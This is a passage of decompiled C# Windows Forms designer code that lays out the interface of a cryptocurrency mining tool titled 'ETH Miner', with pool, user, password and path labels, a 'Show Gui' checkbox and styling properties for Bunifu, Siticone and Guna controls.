			this.checkBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("checkBox1.BackgroundImage");
			this.checkBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			this.checkBox1.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
			this.checkBox1.BorderRadius = 12;
			this.checkBox1.Checked = true;
			this.checkBox1.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Checked;
			this.checkBox1.Cursor = System.Windows.Forms.Cursors.Default;
			this.checkBox1.CustomCheckmarkImage = null;
			this.checkBox1.Location = new System.Drawing.Point(344, 334);
			this.checkBox1.MinimumSize = new System.Drawing.Size(17, 17);
			this.checkBox1.Name = "checkBox1";
			this.checkBox1.OnCheck.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.checkBox1.OnCheck.BorderRadius = 12;
			this.checkBox1.OnCheck.BorderThickness = 2;
			this.checkBox1.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.checkBox1.OnCheck.CheckmarkColor = System.Drawing.Color.White;
			this.checkBox1.OnCheck.CheckmarkThickness = 2;
			this.checkBox1.OnDisable.BorderColor = System.Drawing.Color.LightGray;
			this.checkBox1.OnDisable.BorderRadius = 12;
			this.checkBox1.OnDisable.BorderThickness = 2;
			this.checkBox1.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
			this.checkBox1.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
			this.checkBox1.OnDisable.CheckmarkThickness = 2;
			this.checkBox1.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.checkBox1.OnHoverChecked.BorderRadius = 12;
			this.checkBox1.OnHoverChecked.BorderThickness = 2;
			this.checkBox1.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.checkBox1.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
			this.checkBox1.OnHoverChecked.CheckmarkThickness = 2;
			this.checkBox1.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.checkBox1.OnHoverUnchecked.BorderRadius = 12;
			this.checkBox1.OnHoverUnchecked.BorderThickness = 1;
			this.checkBox1.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
			this.checkBox1.OnUncheck.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.checkBox1.OnUncheck.BorderRadius = 12;
			this.checkBox1.OnUncheck.BorderThickness = 1;
			this.checkBox1.OnUncheck.CheckBoxColor = System.Drawing.Color.Transparent;
			this.checkBox1.Size = new System.Drawing.Size(21, 21);
			this.checkBox1.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
			this.checkBox1.TabIndex = 251;
			this.checkBox1.ThreeState = false;
			this.checkBox1.ToolTipText = null;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel2.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel2.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Location = new System.Drawing.Point(371, 333);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Name = "siticoneLabel2";
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Size = new System.Drawing.Size(76, 23);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).TabIndex = 252;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Text = "Show Gui";
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel3.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel3.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Location = new System.Drawing.Point(88, 94);
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Name = "siticoneLabel3";
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Size = new System.Drawing.Size(39, 23);
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).TabIndex = 253;
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Text = "Pool:";
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel4.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel4.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Location = new System.Drawing.Point(88, 188);
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Name = "siticoneLabel4";
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Size = new System.Drawing.Size(39, 23);
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).TabIndex = 254;
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Text = "Pass:";
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel5.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel5.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).Location = new System.Drawing.Point(88, 141);
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).Name = "siticoneLabel5";
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).Size = new System.Drawing.Size(39, 23);
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).TabIndex = 255;
			((System.Windows.Forms.Control)(object)this.siticoneLabel5).Text = "User:";
			((System.Windows.Forms.Control)(object)this.siticoneLabel6).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel6).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel6.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel6.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel6).Location = new System.Drawing.Point(88, 226);
			((System.Windows.Forms.Control)(object)this.siticoneLabel6).Name = "siticoneLabel6";
			((System.Windows.Forms.Control)(object)this.siticoneLabel6).Size = new System.Drawing.Size(44, 23);
			((System.Windows.Forms.Control)(object)this.siticoneLabel6).TabIndex = 256;
			((System.Windows.Forms.Control)(object)this.siticoneLabel6).Text = "Path:";
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			this.btnLogout.AllowAnimations = true;
			this.btnLogout.AllowBorderColorChanges = true;
			this.btnLogout.AllowMouseEffects = true;
			this.btnLogout.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.btnLogout.AnimationSpeed = 200;
			this.btnLogout.BackColor = System.Drawing.Color.Transparent;
			this.btnLogout.BackgroundColor = System.Drawing.Color.Transparent;
			this.btnLogout.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.btnLogout.BorderRadius = 1;
			this.btnLogout.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.btnLogout.BorderThickness = 1;
			this.btnLogout.ColorContrastOnClick = 30;
			this.btnLogout.ColorContrastOnHover = 30;
			this.btnLogout.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.btnLogout.CustomizableEdges = borderEdges;
			this.btnLogout.DialogResult = System.Windows.Forms.DialogResult.None;
			this.btnLogout.Image = (System.Drawing.Image)resources.GetObject("btnLogout.Image");
			this.btnLogout.ImageMargin = new System.Windows.Forms.Padding(0);
			this.btnLogout.Location = new System.Drawing.Point(695, 12);
			this.btnLogout.Name = "btnLogout";
			this.btnLogout.RoundBorders = false;
			this.btnLogout.ShowBorders = true;
			this.btnLogout.Size = new System.Drawing.Size(35, 35);
			this.btnLogout.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.btnLogout.TabIndex = 257;
			this.btnLogout.Click += new System.EventHandler(btnLogout_Click);
			base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 17f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(742, 404);
			base.Controls.Add(this.btnLogout);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel6);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel5);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel4);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel3);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel2);
			base.Controls.Add(this.checkBox1);
			base.Controls.Add(this.button1);
			base.Controls.Add(this.radioButtonETC);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel12);
			base.Controls.Add(this.radioButtonETH);
			base.Controls.Add(this.numericUpDown1);
			base.Controls.Add(this.comboBox1);
			base.Controls.Add(this.comboBox2);
			base.Controls.Add(this.textBox3);
			base.Controls.Add(this.textBox2);
			base.Controls.Add(this.statusStrip1);
			base.Controls.Add(this.label3);
			this.Font = new System.Drawing.Font("Century Gothic", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(4);
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "FrmMiner";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "ETH Miner";
			base.TopMost = true;
			base.Load += new System.EventHandler(Miner_Load);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
